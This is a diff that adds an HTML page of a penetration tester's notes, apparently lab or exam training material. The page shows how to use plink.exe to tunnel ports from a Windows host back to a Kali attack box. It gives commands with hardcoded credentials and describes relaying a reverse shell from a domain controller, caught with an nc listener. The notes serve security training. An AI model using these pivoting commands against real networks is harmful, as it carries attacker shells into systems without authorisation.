@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>plink</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>plink</h1><br/>Used to forward a port from a windows box that would normally only be seen localy.<br /><br />1. Transfer plink.exe to the windows<br />2. cmd.exe /c echo y | plink.exe -ssh -l root -pw toortoor -R KaliIP:KaliPort:127.0.0.1:PortToForward KaliIp<br />    <a href=""><img src="images/1135-1.png" alt="images/1135-1.png" /></a><br />3. verify port accessability<br />    <a href=""><img src="images/1135-2.png" alt="images/1135-2.png" /></a><br /><br /><br /><br /><br />This useage is to forward a rev shell from a hidden DC that when executed reaches to a windows 10 machine over port 4444 and is then forwarded to 192.168.119.167 (kali) on port 4444 to handle the shell with nc -nlvp 4444<br /><br />cmd /c echo y | plink.exe -N -L 0.0.0.0:PortRecieving:KaliIP:KaliPort user@kaliIP<br /><a href=""><img src="images/1135-3.png" alt="images/1135-3.png" /></a><br /><a href=""><img src="images/1135-4.png" alt="images/1135-4.png" /></a></div></body></html>
